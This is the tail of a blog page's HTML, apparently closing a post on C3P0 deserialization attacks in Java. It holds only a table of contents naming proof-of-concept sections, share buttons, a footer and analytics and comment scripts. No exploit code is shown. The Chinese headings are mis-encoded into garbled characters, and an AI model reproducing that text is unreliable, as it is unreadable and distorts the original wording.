        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">ä»‹ç»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLClassLoader"><span class="toc-number">3.</span> <span class="toc-text">URLClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">3.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">3.2.</span> <span class="toc-text">æ‰§è¡Œæµç¨‹è¯¦è§£</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jndi%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">jndiåˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-2"><span class="toc-number">4.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">4.2.</span> <span class="toc-text">è°ƒè¯•æµç¨‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0-%E4%B9%8B-HEX%E6%B5%81%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E7%B1%BB%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">C3P0 ä¹‹ HEXæµåŠ è½½ä»»æ„ç±»æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-3"><span class="toc-number">5.1.</span> <span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c3p0%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="toc-number">6.</span> <span class="toc-text">c3p0ä¸å‡ºç½‘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-4"><span class="toc-number">6.1.</span> <span class="toc-text">poc</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=C3p0ååºåˆ—åŒ–"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=C3p0ååºåˆ—åŒ–"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=C3p0ååºåˆ—åŒ–"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=C3p0ååºåˆ—åŒ–&body=Check out this article: https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=C3p0ååºåˆ—åŒ–"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=C3p0ååºåˆ—åŒ–"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=C3p0ååºåˆ—åŒ–"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=C3p0ååºåˆ—åŒ–"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=C3p0ååºåˆ—åŒ–&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/C3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=C3p0ååºåˆ—åŒ–"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    Oceanzbz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
      <ul>
        
          <!-- ä¸è’œå­ç»Ÿè®¡ -->
          <span id="busuanzi_container_site_pv">
              æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  æœ¬ç«™è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº
          </span>
          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-QWTJSPQL4F');
</script>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
